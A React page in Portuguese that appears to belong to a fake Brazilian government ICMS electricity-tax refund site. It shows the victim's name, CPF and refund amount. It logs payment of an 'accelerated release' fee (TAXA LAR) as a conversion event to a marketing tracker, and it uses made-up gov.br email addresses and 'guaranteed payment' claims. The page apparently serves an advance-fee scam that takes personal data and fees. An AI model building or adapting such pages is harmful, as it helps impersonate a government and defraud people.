import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { AlertTriangle, CheckCircle, Info, Clock, FileText, BanknoteIcon, Calendar } from "lucide-react";
import { Link, useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import ScrollToTop from "@/components/ScrollToTop";
import { useUserData } from "@/contexts/UserContext";
import { registerLARPayment } from "@/services/UtmifyService";

// Funções de formatação
const formatarCPF = (cpf: string) => {
  if (!cpf) return "";
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

// Função para calcular a data de previsão de depósito baseada no tipo de pagamento
const obterDataPrevisaoDeposito = (acelerado: boolean) => {
  const data = new Date();
  if (acelerado) {
    // Se acelerado, adicionar apenas 1 hora
    data.setHours(data.getHours() + 1);
  } else {
    // Se não acelerado, adicionar 15 dias úteis
    // Para simplificar, adicionar 21 dias corridos (aproximadamente 15 dias úteis)
    data.setDate(data.getDate() + 21);
  }
  
  return data.toLocaleDateString('pt-BR', {
    day: '2-digit',
    month: '2-digit',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit'
  });
};

export default function Sucesso() {
  const [location, setLocation] = useLocation();
  const { userData } = useUserData();
  
  // Estados para armazenar dados da solicitação
  const [protocolo, setProtocolo] = useState("");
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [valor, setValor] = useState(0);
  const [companhia, setCompanhia] = useState("");
  const [larCompleto, setLarCompleto] = useState(false);
  const [acelerado, setAcelerado] = useState(false);
  const [dataPrevisao, setDataPrevisao] = useState("");
  
  // Obter dados do contexto do usuário
  useEffect(() => {
    // Verificar se temos os dados necessários
    if (!userData.cpf) {
      console.log("Dados insuficientes, redirecionando...");
      setLocation("/");
      return;
    }
    
    // Define o protocolo a partir do contexto ou gera um novo
    setProtocolo(userData.protocolo || `${userData.cpf.substring(0, 4)}4714${userData.cpf.substring(6, 9)}`);
    
    // Preencher dados com os valores do contexto
    setCpf(userData.cpf);
    setNome(userData.nome);
    setValor(userData.valorRestituicao || 0);
    setCompanhia(userData.companhia);
    
    // Definir status de pagamento LAR
    setLarCompleto(userData.larCompleto || false);
    setAcelerado(userData.acelerado || false);
    
    // Definir data de previsão baseada no tipo de pagamento
    setDataPrevisao(obterDataPrevisaoDeposito(userData.acelerado || false));
  }, [userData, setLocation]);
  
  // Efeito para registrar o evento de PAID da LAR quando o usuário acessa esta página
  useEffect(() => {
    const dispararEventoPagamentoLAR = async () => {
      try {
        // Verificar se temos os dados mínimos necessários e se o usuário optou pelo LAR
        if (userData.nome && userData.cpf && userData.acelerado) {
          console.log('[Utmify] Registrando evento de PAID da TAXA LAR (3/3)');
          
          // Montar objeto com dados do usuário
          const dadosUsuario = {
            nome: userData.nome,
            cpf: userData.cpf,
            email: userData.email || `${userData.cpf.substring(0, 3)}xxx${userData.cpf.substring(userData.cpf.length-2)}@restituicao.gov.br`,
            telefone: userData.telefone || "(11) 99999-9999",
            ip: userData.ip || "127.0.0.1"
          };
          
          // Registrar evento de PAID para a TAXA LAR (3/3)
          const response = await registerLARPayment(dadosUsuario, 'paid', userData.pagamentoId);
          
          if (response.success) {
            console.log('[Utmify] Evento de PAID da TAXA LAR registrado com sucesso:', response.data);
          } else {
            console.error('[Utmify] Erro ao registrar evento de PAID da TAXA LAR:', response.error);
          }
        } else {
          console.log('[Utmify] Usuário não optou pela LAR ou dados insuficientes, não registrando evento paid');
        }
      } catch (error) {
        console.error('[Utmify] Erro ao registrar evento de PAID da TAXA LAR:', error);
      }
    };
    
    // Executar a função para registrar o pagamento
    dispararEventoPagamentoLAR();
  }, []); // Executar apenas uma vez quando a página carregar
  
  // Formatar valores para exibição
  const valorRestituicaoFormatado = formatarMoeda(valor);
  const cpfFormatado = formatarCPF(cpf);
  
  return (
    <>
      <ScrollToTop />
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          {/* Cabeçalho com informações da restituição */}
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <FileText className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {protocolo}
                </div>
                <div className="bg-green-600 text-white text-xs px-2 py-1 rounded mt-1 inline-flex items-center">
                  <CheckCircle size={12} className="mr-1" />
                  Processo completo
                </div>
                {acelerado && (
                  <div className="bg-amber-600 text-white text-xs px-2 py-1 rounded mt-1 inline-flex items-center">
                    <Clock size={12} className="mr-1" />
                    Liberação Acelerada
                  </div>
                )}
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Valor a Receber:</p>
                <p className="font-bold text-lg text-white">{valorRestituicaoFormatado}</p>
              </div>
            </div>
          </div>
          
          <div className="mb-5">
            <Alert className="border-green-500 bg-green-50">
              <CheckCircle className="h-5 w-5 text-green-600" />
              <AlertTitle className="font-bold text-green-800">
                PROCESSO CONCLUÍDO COM SUCESSO
              </AlertTitle>
              <AlertDescription className="text-green-700">
                Sua solicitação de restituição foi processada com sucesso. Abaixo você pode verificar
                os detalhes do seu pedido e a previsão de depósito.
              </AlertDescription>
            </Alert>
          </div>
          
          <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm mb-6">
            <div className="flex justify-center mb-6">
              <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center">
                <CheckCircle className="h-12 w-12 text-white" />
              </div>
            </div>
            
            <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
              Restituição Aprovada
            </h2>
            
            <p className="text-center text-gray-600 mb-8">
              Seu processo de restituição foi concluído com sucesso e seu pagamento está sendo processado.
            </p>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
                <h3 className="font-bold text-gray-800 mb-3 flex items-center">
                  <BanknoteIcon className="mr-2 h-5 w-5 text-green-600" />
                  Informações do Pagamento
                </h3>
                
                <div className="space-y-3">
                  <div>
                    <p className="text-sm text-gray-500">Valor da Restituição:</p>
                    <p className="font-bold text-xl text-green-600">{valorRestituicaoFormatado}</p>
                  </div>
                  
                  <div>
                    <p className="text-sm text-gray-500">Forma de Pagamento:</p>
                    <p className="font-medium text-gray-800">Depósito Bancário</p>
                  </div>
                  
                  <div>
                    <p className="text-sm text-gray-500">Status:</p>
                    <p className="font-medium text-gray-800 flex items-center">
                      <span className="inline-block w-2 h-2 bg-green-600 rounded-full mr-2"></span>
                      {acelerado ? "Processando (prioridade)" : "Processando"}
                    </p>
                  </div>
                  
                  <div>
                    <p className="text-sm text-gray-500">Previsão de Depósito:</p>
                    <p className="font-medium text-gray-800 flex items-center">
                      <Calendar className="mr-1 h-4 w-4 text-blue-600" />
                      {dataPrevisao}
                    </p>
                  </div>
                </div>
              </div>
              
              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
                <h3 className="font-bold text-gray-800 mb-3 flex items-center">
                  <Info className="mr-2 h-5 w-5 text-blue-600" />
                  Dados do Solicitante
                </h3>
                
                <div className="space-y-3">
                  <div>
                    <p className="text-sm text-gray-500">Nome Completo:</p>
                    <p className="font-medium text-gray-800">{nome}</p>
                  </div>
                  
                  <div>
                    <p className="text-sm text-gray-500">CPF:</p>
                    <p className="font-medium text-gray-800">{cpfFormatado}</p>
                  </div>
                  
                  <div>
                    <p className="text-sm text-gray-500">Companhia Elétrica:</p>
                    <p className="font-medium text-gray-800">{companhia}</p>
                  </div>
                  
                  {/* Email para notificação removido conforme solicitado */}
                </div>
              </div>
            </div>
            
            <div className={`p-4 ${acelerado ? "bg-amber-50 border-amber-200" : "bg-blue-50 border-blue-200"} rounded-lg border mb-6`}>
              <h3 className="font-bold text-gray-800 mb-2 flex items-center">
                <Clock className={`mr-2 h-5 w-5 ${acelerado ? "text-amber-600" : "text-blue-600"}`} />
                {acelerado ? "Entrega Acelerada (60 minutos)" : "Prazo de Entrega (15 dias úteis)"}
              </h3>
              
              <p className={`text-sm ${acelerado ? "text-amber-700" : "text-blue-700"}`}>
                {acelerado
                  ? "Você optou pela Liberação Acelerada de Restituição (LAR). Seu pagamento será processado com prioridade e você receberá o valor em até 60 minutos."
                  : "Seu valor de restituição será processado e depositado no prazo regular de até 15 dias úteis conforme a disponibilidade de fundos."}
              </p>
            </div>
            
            <div className="border-t border-gray-200 pt-6">
              <div className="flex flex-col md:flex-row justify-between items-center gap-4">
                <div className="text-sm text-gray-600">
                  <p>Um comprovante deste processo foi enviado para seu email.</p>
                  <p>Guarde o número de protocolo: <span className="font-medium">{protocolo}</span></p>
                </div>
                
                <Button
                  asChild
                  className="bg-[#1351B4] hover:bg-[#0D47A1]"
                >
                  <Link href="/">Voltar ao Início</Link>
                </Button>
              </div>
            </div>
          </div>
          
          <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm mb-6">
            <h3 className="font-bold text-lg text-gray-800 mb-4">Perguntas Frequentes</h3>
            
            <div className="space-y-4">
              <div>
                <h4 className="font-semibold text-gray-700 mb-1">Quando vou receber minha restituição?</h4>
                <p className="text-sm text-gray-600">
                  {acelerado
                    ? "Você optou pela Liberação Acelerada, por isso seu pagamento será processado e depositado em até 60 minutos."
                    : "O prazo padrão para pagamento é de até 15 dias úteis, dependendo do volume de solicitações."}
                </p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-700 mb-1">Como saberei quando o pagamento for realizado?</h4>
                <p className="text-sm text-gray-600">
                  Você receberá uma notificação por email quando o pagamento for processado e depositado na sua conta bancária.
                </p>
              </div>
              
              <div>
                <h4 className="font-semibold text-gray-700 mb-1">O que fazer se não receber o pagamento no prazo?</h4>
                <p className="text-sm text-gray-600">
                  Caso não receba o pagamento no prazo estipulado, entre em contato com nossa central de atendimento 
                  pelo email suporte@restituicaoicms.gov.br informando seu número de protocolo.
                </p>
              </div>
            </div>
          </div>
          
          <div className="mb-4">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">PROCESSO SEGURO</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Autenticação verificada</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Dados protegidos</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Pagamento garantido</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}